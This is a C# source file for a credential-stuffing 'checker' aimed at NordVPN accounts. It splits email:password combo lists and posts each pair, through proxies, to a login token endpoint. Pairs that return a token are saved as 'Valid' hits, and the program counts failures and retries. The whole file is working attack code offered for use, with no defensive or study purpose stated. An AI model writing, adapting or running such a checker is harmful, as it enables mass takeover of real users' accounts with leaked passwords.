using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using xNet;
using ByteLib;
using System.Windows.Forms.VisualStyles;
using System.Runtime.CompilerServices;

namespace exampleByteLib
{    
    public class Program
    {
        public static Variables var = new Variables();
        public static data Combos = new data();


        [STAThread]
        static void Main(string[] args)
        {
            // Format: (useProxy[true/false], nameChecker, coder, (string)versionChecker(optional))
            nod.Config(new configuration(true, "NordVPN", "bnja#0606"));

            // Inicialize program
            Checker.Init();

            // Run checker
            Checker.Start(startMethod);
            Console.ReadLine();
        }
        

        public static void startMethod()
        {
            for (; ; )
            {
                try
                {
                    bool checkAll = Variables.ComboList.Count - 1 <= Variables.Index;
                    if (checkAll) break;

                    Variables.Index++;

                    // This verifies that the list of combos contains email:pass
                    bool Flag = Variables.ComboList[Variables.Index].Split(new char[]
                        {
                            ':'
                        }).Count<string>() == 2;

                    if (Flag)
                    {

                        // This is to separate the email from the password
                        string email = Variables.ComboList[Variables.Index].Split(new char[]
                        {
                            ':'
                        })[0];
                        string password = Variables.ComboList[Variables.Index].Split(new char[]
                        {
                            ':'
                        })[1];

                        string acc = email + ":" + password;

                        try
                        {
                            string data = "username=" + email + "&password=" + password;
                            string response = Checker.post("https://zwyr157wwiu6eior.com/v1/users/tokens", var.proxyType, true,
                                "application/x-www-form-urlencoded", data);

                            if (response.Contains("token"))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine(" [Valid] " + acc);
                                Checker.Increment_CPM++;
                                Variables.Hits++;
                                Variables.Progress++;
                                Combos.Results(acc, "Valid");
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine(" [Bad] " + acc);
                                Checker.Increment_CPM++;
                                Variables.Fails++;
                                Variables.Progress++;
                            }
                        }
                        catch
                        {
                            Console.WriteLine(" [Retrie] " + acc);
                            Variables.Retries++;
                            Variables.Progress++;
                            
                        }
                    }
                }
                catch
                {
                }
            }
        }
    }
}
